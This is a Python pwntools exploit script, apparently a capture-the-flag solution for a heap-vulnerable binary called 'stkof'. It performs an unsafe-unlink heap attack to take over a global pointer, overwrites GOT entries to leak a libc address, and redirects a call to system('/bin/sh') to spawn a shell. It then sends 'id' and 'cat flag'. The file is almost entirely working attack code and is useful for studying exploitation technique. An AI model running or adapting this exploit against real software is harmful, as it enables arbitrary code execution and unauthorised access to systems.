from pwn import *

print '-------------------'
print '-------stkof-------'
print '--pwned by pwnWiz--'
print '-------------------'

#context.log_level="debug"

s=process('./stkof')
e=ELF('./stkof')

bss = 0x602150

def one(size): # allocate
	s.sendline("1")
	s.sendline(size)
	s.recv()

def two(index, size, data): # modify
	s.sendline("2")
	s.sendline(index)
	s.sendline(size)
	s.sendline(data)
	s.recv()

def three(index): # free
	s.sendline("3")
	s.sendline(index)
	s.recv()

def four(index): # list 
	s.sendline("4")
	s.sendline(index)
	leak=u64(s.recv(6)+"\x00"*2)
	print 'leaked : ' + str(hex(leak))
	s.recv()
	return leak

one("128") #smallbin 1
one("128") #smallbin 2
one("128") #smallbin 3

two("2", "144", p64(0)*2+p64(bss-0x8*3)+p64(bss-0x8*2)+p64(0)*12+p64(0x80)+p64(0x90))

three("3") # free smallbin 3 => unsafe_unlink
	   # modify 2 starts at (bss-0x8*3)
two("2", "24", p64(0)*2+p64(e.got['strlen'])) #overwrite global_pointer
two("1", "8", p64(e.plt['puts'])) # strlen_got -> puts_plt

two("2", "24", p64(0)*2+p64(e.got['free'])) #overwrite global_pointer

leak = four("1") # leak free_got
libc = leak - 0x844f0 
system = libc + 0x45390 
print 'libc   : ' + str(hex(libc))
print 'system : ' + str(hex(system))

two("2", "24", p64(0)*2+p64(e.got['strlen'])) #overwrite global_pointer
two("1", "8", p64(system)) # strlen_got -> system
two("2", "24", p64(0)*2+p64(e.got['free']))  #overwrite global_pointer
two("1", "8", "/bin/sh;") # got_free -> /bin/sh

s.sendline("4")
s.sendline("1") # 1-> free -> /bin/sh ==> system(/bin/sh)
s.sendline("id")
s.sendline("cat flag")

s.interactive()
